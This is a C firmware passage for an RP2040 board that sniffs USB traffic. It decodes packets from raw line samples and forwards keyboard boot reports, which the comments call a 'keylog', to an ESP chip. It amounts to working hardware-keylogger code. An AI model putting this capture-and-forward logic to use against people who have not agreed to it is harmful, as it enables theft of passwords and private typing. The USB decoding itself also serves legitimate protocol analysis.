// with another endpoint's layout.
static bool last_pid_in = false;    // did the previous packet start an IN?
static bool last_pid_setup = false; // a SETUP?

// Take the decoded packet at g_display_ptr and move the cursor to the next one. It applies
// the folding rules, passes the control requests and the IN data to usb_hid.h, and queues
// for the ESP the raw 8-byte reports usb_hid.h does not take. A decoded packet is its
// flags word, its time word and ceil(size/4) payload words. Returns false only when the
// buffer looks corrupt, which ends the walk.
static bool print_packet(void)
{
    int flags = last_dbuff->g_buffer[g_display_ptr];    // status flags | byte size
    int time = last_dbuff->g_buffer[g_display_ptr + 1]; // packet timestamp
    int ftime = time - g_ref_time;                      // time relative to the chosen origin
    int delta = time - g_prev_time;                     // gap since the previous packet
    int size = flags & CAPTURE_SIZE_MASK;               // decoded length in bytes
    uint8_t *payload = (uint8_t *)&(last_dbuff->g_buffer[g_display_ptr + 2]);
    int pid = payload[1] & 0x0f;         // PID nibble (byte 0 is SYNC)
    // The address and endpoint of the IN or SETUP token, kept as values when the token is seen;
    // the report bytes come from the DATA after it.
    static int last_in_addr = 0;
    static int last_in_ep = 0;
    // Per endpoint: the address and the 8 bytes of the last report forwarded.
    static uint8_t last_report[16][9];

    // A huge time gap almost always means the buffer indexing has slipped: stop the walk.
    if (g_check_delta && delta > MAX_PACKET_DELTA)
    {
        printf("Time delta between packets is too large, possible buffer corruption.\r\n");
        return false;
    }

    // Advance to the next packet: 2 header words + ceil(size/4) payload words.
    g_display_ptr += (((size + 3) / 4) + 2);

    g_prev_time = time;
    g_check_delta = true;

    if (flags & CAPTURE_LS_SOF)
    {
        pid = Pid_Sof;
    }

    if ((g_display_time == DisplayTime_SOF && pid == Pid_Sof) || (g_display_time == DisplayTime_Previous))
    {
        g_ref_time = time;
    }

    // Inside a folded run of empty frames (a SOF or keep-alive with only IN and NAK after it),
    // skip everything up to the next frame marker that does not fold.
    if (g_folding)
    {
        if (pid != Pid_Sof)
        {
            return true; // skip the IN/NAK chatter inside the folded frame
        }

        if (flags & CAPTURE_MAY_FOLD)
        {
            g_fold_count++; // another empty frame in the run
            return true;
        }

        // Would print "Folded N frames" where each run ends. display_buffer() prints it only for
        // a run still open when the walk ends, and the last frame marker of a buffer always closes
        // the run, since handle_folding() flags a marker only when it sees the next one.
        // print_g_fold_count(g_fold_count);
        g_folding = false; // this SOF starts a real frame: end the folded run
    }

    // Start folding when an empty frame is seen (and folding is enabled).
    if (flags & CAPTURE_MAY_FOLD && g_display_fold == DisplayFold_Enabled)
    {
        g_folding = true;
        g_fold_count = 1;
        return true;
    }

    // Bus reset or detach: never folded. Optionally re-base the time origin, and suppress
    // the delta check across the reset (time is discontinuous there).
    if (flags & CAPTURE_RESET)
    {
        if (g_display_time == DisplayTime_Reset)
        {
            g_ref_time = time;
        }

        g_check_delta = false;
        usb_wide_seen = false; // a new enumeration: the keyboard may now send boot reports
        usb_hid_bus_reset();
        last_pid_in = false;
        last_pid_setup = false;

        return true;
    }

    // Low speed keep-alive frame marker: nothing to forward.
    if (flags & CAPTURE_LS_SOF)
    {
        return true;
    }

    // A packet with an error: nothing is forwarded, and no DATA after it pairs with a token
    // before it.
    if (flags & CAPTURE_ERROR_MASK)
    {
        last_pid_in = false;
        last_pid_setup = false;
        return true;
    }

    // What is used from here on: the device's answer to an IN, and the SETUPs with which the PC
    // reads its descriptors.
    bool data = pid == Pid_Data0 || pid == Pid_Data1 || pid == Pid_Data2;

    if (pid == Pid_In || pid == Pid_Setup)
    {
        int v = (payload[3] << 8) | payload[2]; // token: addr in the low 7 bits, endpoint above
        last_in_addr = v & 0x7f;
        last_in_ep = (v >> 7) & 0xf;
        last_pid_in = pid == Pid_In;
        last_pid_setup = pid == Pid_Setup;
    }
    else if (data && last_pid_setup && size - 4 == 8)
    {
        usb_hid_setup(last_in_addr, &payload[2]); // the control requests usb_hid.h follows
        last_pid_setup = false;
    }
    // A device whose descriptors were seen is decoded with them (usb_hid.h), and EP0 carries
    // descriptors, never a keystroke: neither goes down the raw path below.
    else if (data && last_pid_in && usb_hid_in(last_in_addr, last_in_ep, pid, &payload[2], size - 4))
    {
        last_pid_in = false;
    }
    else
    {
        last_pid_setup = false;

        // An IN token to an interrupt endpoint followed at once by an 8-byte DATA packet is
        // read as a boot report, the format of a boot-protocol keyboard. EP0 is excluded: it
        // only carries the enumeration's descriptors and control replies, 24 of them per
        // plug-in, never a keystroke. size-4 strips SYNC, PID and CRC16, leaving the 8 report
        // bytes. The report goes to the ESP as a text line.
        // A report equal to the last one on its endpoint holds no keystroke (a keyboard
        // repeating at its idle rate, a resend after a lost ACK, a second interface
        // mirroring an empty report): it is logged as "same" and not shipped, or such a
        // keyboard would fill the keylog with nothing.
        if (last_pid_in && last_in_ep != 0 && (pid == Pid_Data0 || pid == Pid_Data1 || pid == Pid_Data2) &&
            size - 4 == 8)
        {
            uint8_t *last = last_report[last_in_ep];
            if (last[0] == last_in_addr && memcmp(last + 1, &payload[2], 8) == 0)
            {
                printf("IN: 0x%x/0x%x same;\r\n", last_in_addr, last_in_ep);
                last_pid_in = false;
                return true;
            }
            last[0] = (uint8_t)last_in_addr;
            memcpy(last + 1, &payload[2], 8);

            char pkts[SPI_FRAME_SIZE] = {0};
            sprintf(pkts, "IN: 0x%x/0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x 0x%x;\r\n", last_in_addr, last_in_ep,
                    payload[2], payload[3], payload[4], payload[5], payload[6], payload[7], payload[8], payload[9]);

            puts(pkts);

            usb_report_dispatch(pkts); // kept in the ring until the ESP's sequence confirms it
        }
        // More than 8 bytes (an NKRO bitmap, a long key array, a report ID: only full speed carries
        // them) from a device whose descriptors were not seen cannot be read without them. Its keys
        // are not forwarded, and the bus verdict tells the page so (usb_bus.h).
        else if (last_pid_in && last_in_ep != 0 && (pid == Pid_Data0 || pid == Pid_Data1 || pid == Pid_Data2) &&
                 size - 4 > 8)
        {
            last_dbuff->g_buffer_info.wide++;

            if (!usb_wide_seen)
            {
                usb_wide_seen = true;
                printf("usb capture: %d-byte report on 0x%x/0x%x and its descriptors not seen, only 8-byte boot "
                       "reports are forwarded\r\n",
                       size - 4, last_in_addr, last_in_ep);
            }
        }

        last_pid_in = false;
    }

    return true;
}

// Walk every decoded packet of last_dbuff through print_packet(), then print the Total:
// line (errors, bus resets with the detaches, packets, frames, empty frames, and at full
// speed what core 0 did not store). Runs on core 1 after process_buffer() has decoded.
static void display_buffer(void)
{
    if (last_dbuff->g_buffer_info.count == 0)
    {
        printf("\r\nCapture buffer is empty\r\n");
        return;
    }

    printf("\r\nCapture buffer:\r\n");

    // Reset the display walk state and seed the time origin from the first packet.
    g_ref_time = last_dbuff->g_buffer[1];
    g_prev_time = last_dbuff->g_buffer[1];

    if (last_dbuff->g_buffer_info.after_overrun)
    {
        last_pid_in = false;
        last_pid_setup = false;
    }
    g_folding = false;
    g_check_delta = true;
    g_fold_count = 0;
    g_display_ptr = 0;

    for (int i = 0; i < last_dbuff->g_buffer_info.count; i++)
    {
        if (!print_packet())
        {
            break;
        }
    }

    if (g_folding && g_fold_count)
    {
        print_g_fold_count(g_fold_count);
    }

    printf("\r\n");
    printf("Total: ");
    printf("%d", last_dbuff->g_buffer_info.errors);
    printf(" error");
    printf(", ");
    printf("%d", last_dbuff->g_buffer_info.resets);
    printf(" bus reset");
    printf(", ");
    printf("%d", last_dbuff->g_buffer_info.count);
    printf(last_dbuff->g_buffer_info.fs ? " FS packet" : " LS packet");
    printf(", ");
    printf("%d", last_dbuff->g_buffer_info.frames);
    printf(" frame");
    printf(", ");
    printf("%d", last_dbuff->g_buffer_info.folded);
    printf(" empty frame");

    if (last_dbuff->g_buffer_info.fs)
    {
        printf(", %d idle polls and %d other packets not stored, %d reports over 8 bytes not forwarded",
               last_dbuff->g_buffer_info.polls, last_dbuff->g_buffer_info.other, last_dbuff->g_buffer_info.wide);
    }

    printf("\r\n\r\n");
}

// Running CRC16 over data. Seed is 0xFFFF (per USB spec). The callers run this
// over payload + received CRC together: an intact DATA packet yields the fixed
// residual 0xB001, which is how the CRC is validated without splitting it out.
static uint16_t crc16_usb(uint8_t *data, int size)
{
    uint16_t crc = 0xffff;

    for (int i = 0; i < size; i++)
    {
        crc = crc16_usb_tab[(crc ^ data[i]) & 0xff] ^ (crc >> 8);
    }

    return crc;
}

// Running CRC5 over data, seeded with 0xFF where USB seeds five 1s: the three extra 1s
// invert the top three bits of the first byte, so the residual depends on the length.
// Over the 11-bit field and CRC5 of an intact IN, OUT, SETUP, SOF or PING it is 0x09. An
// intact SPLIT (3 bytes) would leave 0x0E and be flagged, but SPLIT never travels on a
// low or full speed cable.
static uint8_t crc5_usb(uint8_t *data, int size)
{
    uint8_t crc = 0xff;

    for (int i = 0; i < size; i++)
    {
        crc = crc5_usb_tab[(crc ^ data[i]) & 0xff] ^ (crc >> 8);
    }

    return crc;
}

// Error-indicator hook (e.g. an LED). Intentionally a no-op in this build.
static void set_error(bool error)
{
    return;
}

// Counts the packets with an error and marks "empty" frames so the display can fold
// them. A frame runs from one SOF (or low speed keep-alive) to the next and is "empty"
// if it holds nothing but IN/NAK polling and no errors. Called once per decoded packet.
// g_sof_index remembers where the current frame's SOF header word lives so the
// CAPTURE_MAY_FOLD flag can be set on it retroactively once the frame ends.
static void handle_folding(int pid, uint32_t error)
{
    if (error)
    {
        last_dbuff->g_buffer_info.errors++;
        set_error(true);
    }

    if (pid == Pid_Sof)
    {
        last_dbuff->g_buffer_info.frames++;

        // If the frame that just ended stayed empty, flag its SOF as foldable.
        if (g_may_fold)
        {
            last_dbuff->g_buffer[g_sof_index] |= CAPTURE_MAY_FOLD;
            last_dbuff->g_buffer_info.folded++;
        }

        g_sof_index = g_wr_ptr - 2; // this SOF's header word
        g_may_fold = true;          // new frame starts out assumed empty
    }
    else if (pid != Pid_In && pid != Pid_Nak)
    {
        g_may_fold = false; // real traffic (anything but IN/NAK): not an empty frame
    }

    if (error)
    {
        g_may_fold = false; // an error anywhere in the frame disqualifies folding
    }
}

// Decode one captured packet: raw D+ samples (NRZI-encoded, bit-stuffed) in, packet
// bytes and error flags out. The PIO only records line levels; this undoes the USB
// line coding and checks the result.
//
//   'size'    = the packet's line samples, its SE0 sample left out.
//   out_data  = &g_buffer[g_wr_ptr]: decoded bytes are written back into the same
//               buffer (in-place compaction; the decode cursor g_rd_ptr always
//               stays ahead of the write cursor g_wr_ptr).
//   'v'       = NRZI accumulator. Its seed, a single top bit, stands for the sample
//               before the first one (D+ high), and v carries the last sample of
//               each 31-bit word into the next.
static void process_packet(int size)
{
    uint8_t *out_data = (uint8_t *)&(last_dbuff->g_buffer[g_wr_ptr]);
    uint32_t v = 0x80000000; // NRZI "previous sample" accumulator
    uint32_t error = 0;      // accumulated CAPTURE_ERROR_* flags
    int out_size = 0;        // decoded bytes produced so far
    int out_bit = 0;         // bit position within the byte being assembled
    int out_byte = 0;        // byte currently being assembled (LSB-first)
    int stuff_count = 0;     // consecutive 1s, for bit de-stuffing
    int pid, npid;

    // The read cursor stops at the end of the buffer and flags the packet. process_buffer()
    // rejects a bit count only above 0xffff, so a corrupt count of 65535 asks this loop for
    // 2115 words, and started near the end of the 16000-word buffer it would read on into
    // g_buffer_info and the other buffer.
    const int raw_words = (int)(sizeof(last_dbuff->g_buffer) / sizeof(last_dbuff->g_buffer[0]));

    // The raw samples arrive packed 31 bits per word (PIO autopush threshold).
    while (size)
    {
        if (g_rd_ptr >= raw_words)
        {
            error |= CAPTURE_ERROR_SIZE;
            break;
        }

        uint32_t w = last_dbuff->g_buffer[g_rd_ptr++];
        int bit_count;

        if (size < 31)
        {
            w <<= (30 - size); // left-justify the final partial word into place
            bit_count = size;
        }
        else
        {
            bit_count = 31;
        }

        // NRZI transition map for the whole word in one step: (w ^ (w<<1)) sets a
        // bit wherever two adjacent samples differ (a transition, an NRZI 0).
        // XOR-ing into v carries the phase across word boundaries.
        v ^= (w ^ (w << 1));

        for (int i = 0; i < bit_count; i++)
        {
            // The top bit of v is 1 where the line changed at this bit: NRZI gives a 0
            // there and a 1 where the line held.
            int bit = (v & 0x80000000) ? 0 : 1;

            v <<= 1;

            // Bit de-stuffing: after six 1s in a row the sender inserts a 0, dropped
            // here. A 1 there makes seven 1s in a row: a packet its sender aborted on
            // purpose (USB 2.0 8.6.4, 11.3.3, 11.18.6.1), or a stuffing or line error.
            if (stuff_count == 6)
            {
                if (bit)
                {
                    error |= CAPTURE_ERROR_STUFF;
                }

                stuff_count = 0;
                continue; // discard the stuffed bit (do not emit it)
            }
            else if (bit)
            {
                stuff_count++;
            }
            else
            {
                stuff_count = 0;
            }

            // Assemble surviving bits into bytes, LSB-first (USB bit order).
            out_byte |= (bit << out_bit);
            out_bit++;

            if (out_bit == 8)
            {
                out_data[out_size++] = out_byte;
                out_byte = 0;
                out_bit = 0;
            }
        }

        size -= bit_count;
    }

    // The packet must end on a whole byte; leftover bits mean a framing error. One trailing 1 is
    // the last bit stretched by hub switching skew (USB 2.0 7.1.9.1; up to 15 ns a hub at full
    // speed and 200 ns at a low speed port, 7.1.14.1): every byte before it is still checked by
    // its PID or CRC. In a full speed model of the capture path the reports were exact with up
    // to 40 ns of stretch and all lost at 50 ns; with this, exact to 130 ns.
    if (out_bit && !(out_bit == 1 && out_byte == 1))
    {
        error |= CAPTURE_ERROR_NBIT;
    }

    if (out_size < 1)
    {
        // This exit too leaves a well formed record. The caller has counted this packet and
        // moved past its header and time slots, so a header word left unwritten is read back
        // as a stale "flags | byte count", and a large stale count skips the rest of the
        // buffer, keystrokes included, for one runt packet from noise or a connect or
        // disconnect.
        //
        // handle_folding(-1, error) does what the normal exit and the bus reset case do: -1
        // is not a real PID (Sof 5, In 9, Nak 10), so it only counts the error and keeps this
        // frame from being folded away as empty. A buffer of runts then does not report
        // "0 error".
        error |= CAPTURE_ERROR_SIZE;
        handle_folding(-1, error);
        last_dbuff->g_buffer[g_wr_ptr - 2] = error | out_size;
        g_wr_ptr += (out_size + 3) / 4;

        return;
    }

    // Byte 0 must be the SYNC field, which decodes to 0x80. At low speed D+ idles low, so
    // against the D+ high that the seed of v stands for, the first bit decodes as 1 and the
    // byte reads 0x81.
    if (out_data[0] != (last_dbuff->g_buffer_info.fs ? 0x80 : 0x81))
    {
        error |= CAPTURE_ERROR_SYNC;
    }

    if (out_size < 2)
    {
        // As for out_size < 1 above: write the header word so the reader stays in step.
        error |= CAPTURE_ERROR_SIZE;
        handle_folding(-1, error);
        last_dbuff->g_buffer[g_wr_ptr - 2] = error | out_size;
        g_wr_ptr += (out_size + 3) / 4;

        return;
    }

    // Byte 1 is the PID byte: low nibble = PID, high nibble = its complement.
    pid = out_data[1] & 0x0f;
    npid = (~out_data[1] >> 4) & 0x0f;

    // The two nibbles must be complementary. PID 0 is flagged too: reserved in USB 2.0, it is
    // the EXT token of the LPM ECN.
    if ((pid != npid) || (pid == Pid_Reserved))
    {
        error |= CAPTURE_ERROR_PID;
    }

    // Token / SOF / PING / SPLIT packets carry a 5-bit CRC. Check length first
    // (SPLIT is 5 bytes, the rest are 4: SYNC + PID + 2 payload/CRC bytes), then
    // run CRC5 over payload+CRC: an intact IN, OUT, SETUP, SOF or PING leaves 0x09, and
    // an intact SPLIT would leave 0x0E and be flagged (crc5_usb()).
    if (pid == Pid_Sof || pid == Pid_In || pid == Pid_Out || pid == Pid_Setup || pid == Pid_Ping || pid == Pid_Split)
    {
        if (((pid == Pid_Split) && (out_size != 5)) || ((pid != Pid_Split) && (out_size != 4)))
        {
            error |= CAPTURE_ERROR_SIZE;
        }
        else if (crc5_usb(&out_data[2], out_size - 2) != 0x09)
        {
            error |= CAPTURE_ERROR_CRC;
        }
    }
    // DATA packets carry a 16-bit CRC; an intact data packet leaves 0xB001.
    else if (pid == Pid_Data0 || pid == Pid_Data1 || pid == Pid_Data2 || pid == Pid_MData)
    {
        if (out_size < 4)
        {
            error |= CAPTURE_ERROR_SIZE;
        }
        else if (crc16_usb(&out_data[2], out_size - 2) != 0xb001)
        {
            error |= CAPTURE_ERROR_CRC;
        }
    }

    handle_folding(pid, error);

    // Write the packet header word back in place: error flags OR'ed with the byte
    // count, then advance the write cursor past this packet's ceil(size/4) words.
    last_dbuff->g_buffer[g_wr_ptr - 2] = error | out_size;
    g_wr_ptr += (out_size + 3) / 4;
}

// Reconstruct a packet's start time from its end time and its length in bits.
// A packet of N bits lasts N / (bit rate) microseconds: 12 bits/us at full speed,
// 1.5 bits/us at low speed. The magic multipliers are fixed-point reciprocals
// (x * k >> 16): 5461/65536 ~= 1/12, 43691/65536 ~= 1/1.5, avoiding a divide.
static uint32_t start_time(uint32_t end_time, uint32_t size)
{
    if (last_dbuff->g_buffer_info.fs)
    {
        return end_time - ((size * 5461) >> 16); // Divide by 12 (full speed)
    }
    else
    {
        return end_time - ((size * 43691) >> 16); // Divide by 1.5 (low speed)
    }
}

// Decode a whole capture buffer in place. Reads each raw entry (a SIZE word = bit
// count, plus a time word, plus the packed samples) and classifies it by its bit
// count: 0 = bus reset or detach, 1 = low speed keep-alive (frame mark), otherwise a
// real packet handed to process_packet(). Runs on core 1.
static void process_buffer(void)
{
    // Time origin: the start time of the very first entry.
    uint32_t time_offset = start_time(last_dbuff->g_buffer[1], last_dbuff->g_buffer[0]);
    int out_count = 0;

    // Reset decode cursors and per-buffer counters (read ahead, write behind).
    g_rd_ptr = 0;
    g_wr_ptr = 0;
    g_sof_index = 0;
    g_may_fold = false;

    last_dbuff->g_buffer_info.errors = 0;
    last_dbuff->g_buffer_info.resets = 0;
    last_dbuff->g_buffer_info.frames = 0;
    last_dbuff->g_buffer_info.folded = 0;

    for (int i = 0; i < last_dbuff->g_buffer_info.count; i++)
    {
        uint32_t size = last_dbuff->g_buffer[g_rd_ptr];                       // bit count
        uint32_t time = start_time(last_dbuff->g_buffer[g_rd_ptr + 1], size); // packet start time

        // A bit count above 16 bits cannot come from core 0, which stores no record over
        // CAPTURE_RESERVE_WORDS or with the wrong word count: core 1 lost its place in the
        // buffer. Everything decoded so far is intact (it was compacted behind the read
        // pointer), so keep it and lose only the rest of this buffer.
        if (size > 0xffff)
        {
            printf("Synchronization error after %d packets, the rest of this buffer is lost.\r\n", out_count);
            break;
        }

        // Store the packet's start time (relative to the origin) in the header.
        last_dbuff->g_buffer[g_wr_ptr + 1] = time - time_offset;
        g_rd_ptr += 2;
        g_wr_ptr += 2;
        out_count++;

        if (size == 0)
        {
            // Bit count 0: a sustained SE0, a bus reset or a detach. Never folded.
            last_dbuff->g_buffer[g_wr_ptr - 2] = CAPTURE_RESET;
            handle_folding(-1, 0); // Prevent folding of resets
            last_dbuff->g_buffer_info.resets++;
        }
        else if (size == 1)
        {
            // A single captured bit is a keep-alive EOP. Full speed has no such
            // thing (discard it); low speed uses it as the frame delimiter.
            if (last_dbuff->g_buffer_info.fs)
            {
                out_count--; // Discard the packet
                g_wr_ptr -= 2;
            }
            else
            {
                last_dbuff->g_buffer[g_wr_ptr - 2] = CAPTURE_LS_SOF;
                handle_folding(Pid_Sof, 0); // fold on low speed keep-alives
            }

            g_rd_ptr++; // skip the trailing (empty) sample word
        }
        else
        {
            // A real packet. size counts one extra bit (the first SE0 sample of the EOP), so
            // decode size-1 actual data bits.
            process_packet(size - 1);
            // The raw samples are packed 31 bits/word; when the packet ends within
            // one bit of a word boundary, skip the leftover partial word.
            if (size % 31 <= 1)
            {
                g_rd_ptr++;
            }
        }
    }

    last_dbuff->g_buffer_info.count = out_count;
}

// PIO IRQ handlers. The capture programs do not raise IRQs in normal operation,
// so these are diagnostic stubs that just report and clear any PIO interrupt.
void pio1_irq(void)
{
    printf("PIO1 IRQ!\r\n");
    if (pio1_hw->irq & 1)
    {
        printf("    IRQ 1 !\r\n");
        pio1_hw->irq = 1;
    }
    else if (pio1_hw->irq & 2)
    {
        printf("    IRQ 2 !\r\n");
        pio1_hw->irq = 2;
    }
}

void pio0_irq(void)
{
    printf("PIO0 IRQ!\r\n");
    if (pio0_hw->irq & 1)
    {
        printf("    IRQ 1 !\r\n");
        pio0_hw->irq = 1;
    }
    else if (pio0_hw->irq & 2)
    {
        printf("    IRQ 1 !\r\n");
        pio0_hw->irq = 2;
    }
}

static dbuff_t *__attribute__((optimize("O0"))) GetLastDbuffAddr(void)
{
    return last_dbuff;
}

static void init_esp_seq(void)
{
    esp_link_uart_init();

    bool slave_ready = false;

    for (int i = 0; i < 3000; i++)
    {
        if (gpio_get(ELOG_SLAVEREADY_GPIO))
        {
            slave_ready = true;
            break;
        }

        tight_loop_contents();
    }

    puts(slave_ready ? "SLAVE READY!" : "ESP slave not armed yet, the poll loop will keep retrying");
    esp_link_master_init();
}

// The boot blinks, two at every boot and ten more after a watchdog reset, from core 1's loop so
// they never hold up the decoding of the capture.
static int led_blinks;
static uint32_t led_at;

static void led_poll(void)
{
    if (led_blinks <= 0 || time_us_32() - led_at < 200000)
    {
        return;
    }

    led_at = time_us_32();

    if (gpio_get_out_level(RP_LED_GPIO))
    {
        gpio_put(RP_LED_GPIO, 0);

        if (--led_blinks == 0)
        {
            gpio_set_dir(RP_LED_GPIO, GPIO_IN);
        }
    }
    else
    {
        gpio_put(RP_LED_GPIO, 1);
    }
}

static void led_blink(int n)
{
    if (led_blinks <= 0)
    {
        gpio_init(RP_LED_GPIO);
        gpio_set_dir(RP_LED_GPIO, GPIO_OUT);
        gpio_put(RP_LED_GPIO, 0);
        led_at = time_us_32();
    }

    led_blinks += n;
}

// What main() found before core 1 had the UART to tell it.
static bool boot_watchdog;
static bool boot_clock_ok;
static uint32_t boot_spi_baud;
static volatile uint32_t capture_started_ms;

static void init_seq(void);

// The HID maps kept in flash (usb_hid.h, hid_store_save() and hid_store_load()).
// A ring of RP_STATE_SECTORS sectors: each write goes to the sector after the newest record, with
// the next sequence number, and leaves the older ones whole, so a power cut during a write costs
// only that write. A write happens once the maps have stayed the same for HID_STORE_QUIET_US, no
// more often than every HID_STORE_GAP_US, and only when they differ from the newest record, so a
// keyboard that enumerates again the same way costs nothing.
#define HID_STORE_QUIET_US 1500000u
#define HID_STORE_GAP_US 5000000u

static uint32_t hid_store_base; // 0: the maps are not kept
static int hid_store_newest = -1; // the sector of the newest valid record
static uint32_t hid_store_seq;
static bool hid_store_pending, hid_store_written;
static uint64_t hid_store_written_us;

static void hid_store_write(void);

static void __attribute__((noinline)) hid_store_boot(void)
{
    hid_store_base = rp_state_area();

    if (!hid_store_base)
    {
        printf("usb hid: maps not kept, no flash past the OTA map\r\n");
        return;
    }

    for (int i = 0; i < (int)RP_STATE_SECTORS; i++)
    {
        uint32_t seq;

        if (hid_store_valid(rp_state_read(hid_store_base + (uint32_t)i * FLASH_SECTOR_SIZE), FLASH_SECTOR_SIZE, &seq) &&
            (hid_store_newest < 0 || (int32_t)(seq - hid_store_seq) > 0))
        {
            hid_store_newest = i;
            hid_store_seq = seq;
        }
    }

    if (hid_store_newest < 0)
    {
        printf("usb hid: no maps in flash\r\n");
        return;
    }

    int n = hid_store_load(rp_state_read(hid_store_base + (uint32_t)hid_store_newest * FLASH_SECTOR_SIZE),
                           FLASH_SECTOR_SIZE);

    printf("usb hid: maps of %d devices from flash, record %u in sector %d\r\n", n, (unsigned)hid_store_seq,
           hid_store_newest);
}

static void __attribute__((noinline)) hid_store_tick(void)
{
    static uint64_t changed_us;
    uint64_t now = time_us_64();

    if (hid_store_dirty)
    {
        hid_store_dirty = false;
        hid_store_pending = true;
        changed_us = now;
    }

    if (!hid_store_pending || !hid_store_base || now - changed_us < HID_STORE_QUIET_US ||
        (hid_store_written && now - hid_store_written_us < HID_STORE_GAP_US))
    {
        return;
    }

    hid_store_pending = false;
    hid_store_write();
}

static void __attribute__((noinline)) hid_store_write(void)
{
    uint8_t *buf = rp_state_buffer();
    int devices = 0;
    int len = hid_store_save(buf, FLASH_SECTOR_SIZE, hid_store_seq + 1, &devices);

    // No write when the maps equal the newest record: the same length and the same device records.
    // The compare leaves out the header: its crc covers seq, one more on every write, so with the
    // header no record would ever match and every change that sets hid_store_dirty would write a
    // sector.
    if (hid_store_newest >= 0)
    {
        const uint8_t *cur = rp_state_read(hid_store_base + (uint32_t)hid_store_newest * FLASH_SECTOR_SIZE);
        hid_store_head_t mine;
        hid_store_head_t newest;

        memcpy(&mine, buf, sizeof(mine));
        memcpy(&newest, cur, sizeof(newest));

        if (mine.len == newest.len && memcmp(buf + sizeof(mine), cur + sizeof(newest), mine.len) == 0)
        {
            return;
        }
    }

    int next = (hid_store_newest + 1) % (int)RP_STATE_SECTORS;

    rp_state_write(hid_store_base + (uint32_t)next * FLASH_SECTOR_SIZE, buf, (uint32_t)len);
    hid_store_newest = next;
    hid_store_seq++;
    hid_store_written = true;
    hid_store_written_us = time_us_64();
    printf("usb hid: maps of %d devices kept in flash, %d B, record %u in sector %d\r\n", devices, len,
           (unsigned)hid_store_seq, next);
}

static void hid_store_flush(void)
{
    if (hid_store_base && (hid_store_pending || hid_store_dirty))
    {
        hid_store_pending = false;
        hid_store_write();
    }
}

// Core 1's entry point: it decodes each buffer core 0 hands over through the inter-core
// FIFO and forwards the reports to the ESP, while core 0 keeps capturing into the other
// buffer. Between buffers it polls the ESP, sends the queued reports and logs the counters.
void core1_main()
{
    volatile dbuff_t *readed_last = NULL;

    // The board comes up here while core 0 already captures: the boot blinks, the UART, the
    // ESP's reset release, the SPI and the reports. The first buffer waits for this, about
    // 1.2 s; a buffer holds about 4 s of traffic.
    led_blink(2);
    init_seq();
    hid_store_boot();

    if (boot_watchdog)
    {
        printf("Watchdog caused reset! (expected after flashing and after an OTA commit, "
               "investigate if it happens on a cold power up)\r\n");
        led_blink(10);
    }

    printf(boot_clock_ok ? "Clock successfully set to 120 MHz\r\n" : "Failed to set the clock\r\n");
    printf("SPI re-clocked after the sys clock change: %.2f MHz (%u)\r\n", ((float)boot_spi_baud) / 1000000.0,
           (unsigned)boot_spi_baud);
    printf("PIO clk div: %.2f at low speed, %.2f at full speed\r\n", (float)clock_get_hz(clk_sys) / 15000000.0f,
           (float)clock_get_hz(clk_sys) / 120000000.0f);

    if (!usb_speed_patchable)
    {
        puts("usb capture: unexpected PIO program, low speed only");
    }

    // The RP timer starts only once crt0 has copied the image to RAM: 64 ms after a reset on the
    // dev board, which this does not count.
    printf("capture start! at %u ms on the RP timer, %s speed\r\n", (unsigned)capture_started_ms,
           capture_fs ? "full" : "low");

    // The ESP left reset in init_seq(): it gets one second before the SPI handshake.
    for (uint32_t t0 = time_us_32(); time_us_32() - t0 < 1000000;)
    {
        led_poll();
    }

    init_esp_seq(); // bring up UART + SPI handshake to the ESP

    total_packets_sended = 0;

    while (1)
    {
        if (multicore_fifo_rvalid())
        {
            // Core 0 pushed a buffer and is already capturing into the other one. Decode and
            // forward this one, then release it so core 0 may swap back into it.
            last_dbuff = (volatile dbuff_t *)(uintptr_t)multicore_fifo_pop_blocking();
            process_buffer();
            display_buffer();
            __dmb();
            dbuff_released[last_dbuff == &dbuff2 ? 1 : 0] = true;
        }
        else
        {
            uint32_t polls = esp_poll_ok + esp_poll_failed;
            poll_esp_if_due();
            if (esp_poll_ok + esp_poll_failed != polls)
            {
                wait_esp_consumed(SPI_CONSUMED_TIMEOUT_US); // pace the poll from the first report
            }
            usb_report_flush();

            // The resends go to the UART log, as on the PS/2 build. Resends that climb while
            // nothing is lost are the go-back-N delivery at work, not a fault.
            static unsigned int usb_spi_resends_reported = 0;
            if (usb_spi_resends != usb_spi_resends_reported)
            {
                usb_spi_resends_reported = usb_spi_resends;
                printf("usb spi resent from the esp's sequence %u times, %u reports confirmed\r\n", usb_spi_resends,
                       total_packets_sended);
            }

            static unsigned int capture_overruns_reported = 0;
            if (capture_overruns != capture_overruns_reported)
            {
                capture_overruns_reported = capture_overruns;
                printf("capture overrun: %u packets dropped, core 1 a whole buffer behind\r\n", capture_overruns);
            }

            // A record whose words did not fit its length, and below a full PIO RX FIFO: neither
            // has shown in capture on the bench since core 0 stopped waiting for core 1
            // (2026-10-11), and both are logged so that they show if they ever do. An SWD flash
            // fills the FIFO: it runs on core 0, which then stops draining it.
            static unsigned int capture_desyncs_reported = 0;
            if (capture_desyncs != capture_desyncs_reported)
            {
                capture_desyncs_reported = capture_desyncs;
                printf("capture: %u records dropped, their words did not fit their length\r\n", capture_desyncs);
            }

            static uint32_t esp_reset_glitches_reported = 0;
            if (esp_reset_glitches != esp_reset_glitches_reported)
            {
                esp_reset_glitches_reported = esp_reset_glitches;
                printf("esp reset line low for %u us and back up: not an external reset, no restart (%u so far)\r\n",
                       (unsigned)esp_reset_glitch_us, (unsigned)esp_reset_glitches);
            }

            uint32_t rx_stall = 1u << (PIO_FDEBUG_RXSTALL_LSB + usb_speed_sm0);
            if (pio0->fdebug & rx_stall)
            {
                pio0->fdebug = rx_stall; // write 1 to clear
                printf("capture: PIO RX FIFO was full, samples lost\r\n");
            }

            static uint32_t capture_speed_reported = 0;
            if (capture_speed_epoch != capture_speed_reported)
            {
                capture_speed_reported = capture_speed_epoch;
                printf("usb capture: %s speed\r\n", capture_fs ? "full" : "low");
            }
            report_packets_sent(total_packets_sended);
            usb_bus_watch();
            led_poll();
            hid_store_tick();
        }
    }
}

static void init_seq(void)
{
    delay_boot_if_esp_reset_detected();

    rp_board_boot_init();

    report_last_fault();

    printf("\r\nokhi USB started! Hardware v%s\r\nBuild Date %s %s\r\n", hwver_name, __DATE__, __TIME__);
    fflush(stdout);

    gpio_set_dir(ESP_RESET_GPIO, GPIO_IN);
    gpio_pull_up(ESP_RESET_GPIO);

    uint32_t baud __attribute__((unused)) = rp_spi_master_init();
    printf("SPI Mode 0 at the boot clock: %.2f MHz (%d)\r\n", ((float)baud) / 1000000.0, baud);

    report_flash_layout();
    report_flash_size();
    report_ota_state();

    adc_init();
